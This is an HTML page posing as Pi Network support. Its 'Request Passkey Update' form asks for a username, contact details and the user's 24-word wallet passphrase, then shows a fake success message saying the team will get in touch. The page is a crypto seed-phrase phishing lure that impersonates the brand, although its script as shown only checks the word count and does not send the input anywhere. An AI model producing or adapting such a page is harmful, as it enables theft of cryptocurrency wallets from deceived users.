<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FAQ & Support | Pi Network</title>
    <link rel="stylesheet" href="styles.css"> <!-- External CSS for styling -->
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
        }
        .header {
            background-color: #6A329F;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
        }
        .container {
            width: 50%;
            margin: 40px auto;
            background: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
        }
        .container h2 {
            text-align: center;
            color: #6A329F;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
            color: #333;
            font-family: Arial, sans-serif;
        }
        textarea {
            height: 120px;
            resize: none;
        }
        .btn {
            width: 100%;
            height: 50px;
            background-color: #6A329F;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            margin-top: 15px;
        }
        .btn:hover {
            background-color: #582b84;
        }
        .message {
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
        }
        .info {
            text-align: center;
            font-size: 14px;
            color: gray;
            margin-top: 15px;
        }
        .info a {
            color: #6A329F;
            font-weight: bold;
            text-decoration: none;
        }
        @media (max-width: 768px) {
            .container {
                width: 90%;
            }
        }
    </style>
    <script>
        function validatePassphrase() {
            var passphrase = document.getElementById("passphrase").value.trim();
            var message = document.getElementById("message");
            var words = passphrase.split(/\s+/).filter(word => word.length > 0);

            if (words.length !== 24) {
                message.innerHTML = "Invalid Passphrase. Please enter exactly 24 words.";
                message.style.color = "red";
            } else {
                message.innerHTML = "Request submitted successfully. Our team will contact you.";
                message.style.color = "green";
            }
        }
    </script>
</head>
<body>
    <div class="header">Welcome to Pi Network Support</div>
    <div class="container">
        <h2>Request Passkey Update</h2>
        <input type="text" placeholder="Enter Username">
        <input type="text" placeholder="Enter Email or Phone Number">
        <textarea id="passphrase" placeholder="Enter your 24-word passphrase"></textarea>
        <p id="message" class="message"></p>
        <button class="btn" onclick="validatePassphrase()">Submit Request</button>
        <p class="info">
            Your wallet passphrase is only accessible to you. Recovery is impossible.
            <a href="https://minepi.com/support/" target="_blank">Learn more</a>.
        </p>
    </div>
</body>
</html>
